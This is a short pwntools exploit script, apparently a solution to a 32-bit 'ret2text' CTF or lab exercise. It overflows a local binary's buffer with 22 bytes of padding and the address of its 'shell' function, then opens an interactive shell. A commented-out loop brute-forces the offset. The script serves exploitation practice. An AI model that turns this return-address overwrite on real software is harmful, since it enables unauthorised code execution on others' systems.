
from pwn import *

# debug = False
# 设置调试环境
# context.log_level = 'debug'
# 设置tmux程序
gdb.context.terminal = ["konsole",'-e']

p = process("./ret2text_32")
elf = ELF("./ret2text_32")
# gdb.attach(p)
# log.success("pid = {}".format(pidof(p)))
log.success("shell  = {}".format(hex(elf.sym['shell'])))

shelladd = elf.sym['shell']

offset = 22
# shell = 0x8049186
#
# payload = flat(['a'*offset,p64(shelladd)])
#
# pause()
p.sendline(b'a'*offset+p32(shelladd))

p.interactive()
# from tqdm import tqdm
# for i in tqdm(range(50,80)):
#
#     p = process("./ret2text_32")
#     shell = 0x8049186
#     #
#     # payload = flat(['a'*offset,p64(shelladd)])
#     #
#     p.sendline(b'a' * i + p32(shell))
#     p.sendline("ls")
#     try:
#         print(p.recvline())
#         print(i)
#         p.interactive()
#     except:
#         p.close()
#         continue



